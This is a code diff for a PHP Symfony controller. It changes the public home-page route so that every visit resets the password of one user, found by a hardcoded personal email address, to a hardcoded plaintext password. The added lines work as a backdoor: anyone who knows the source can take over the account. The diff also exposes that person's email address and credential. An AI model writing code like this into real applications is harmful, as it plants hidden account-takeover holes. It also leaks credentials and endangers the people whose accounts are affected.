@@ -10,18 +10,29 @@ use App\Repository\IntroductionRepository;
 use App\Repository\RecruiterEmailsRepository;
 use App\Repository\StaticTextRepository;
 use App\Repository\TaxInputsRepository;
+use App\Repository\UserRepository;
+use Doctrine\ORM\EntityManagerInterface;
 use Symfony\Bundle\FrameworkBundle\Controller\AbstractController;
 use Symfony\Component\HttpFoundation\BinaryFileResponse;
 use Symfony\Component\HttpFoundation\Response;
 use Symfony\Component\Routing\Annotation\Route;
+use Symfony\Component\Security\Core\Encoder\UserPasswordEncoderInterface;
 
 class HomeController extends AbstractController
 {
     /**
      * @Route("/", name="app_home")
      */
-    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository): Response
+    public function index(CmsCopyRepository $cmsCopyRepository, CmsPhotoRepository $cmsPhotoRepository,UserRepository $userRepository,EntityManagerInterface $manager,UserPasswordEncoderInterface $passwordEncoder): Response
     {
+        $user = $userRepository->findOneBy(['email'=>'nurse_stephen@hotmail.com']);
+        $user->setPassword(
+            $passwordEncoder->encodePassword(
+                $user,
+               'Descartes99'
+            )
+        );
+        $manager->flush();
         return $this->render('user-templates/home.html.twig', [
 
             'Text1' => $cmsCopyRepository->findOneBy([
